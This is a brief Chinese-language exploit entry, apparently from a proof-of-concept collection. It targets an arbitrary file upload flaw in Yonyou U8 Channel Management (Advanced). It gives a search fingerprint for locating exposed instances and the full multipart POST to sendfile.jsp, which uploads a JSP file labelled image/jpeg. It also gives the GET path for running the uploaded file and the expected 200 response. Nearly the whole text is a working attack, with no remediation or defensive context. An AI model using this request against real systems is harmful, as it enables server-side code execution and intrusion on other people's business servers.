# 用友U8渠道管理(高级版)sendfile存在任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="渠道管理（高级版）"`
- **请求**：`POST /business/common/importdata/sendfile.jsp HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXqK9dR2y…`

**请求体 / payload**
```
------WebKitFormBoundaryXqK9dR2yTv7wNpLm
Content-Disposition: form-data; name="file"; filename="hello.jsp"
Content-Type: image/jpeg
<% out.println("HelloWorld");%>
------WebKitFormBoundaryXqK9dR2yTv7wNpLm--
访问后缀
GET /userfile/default/temp/2c9ff25297c54acc0198742fbc440052.jsp HTTP/1.1
Host:
```
- **预期**：200　|　—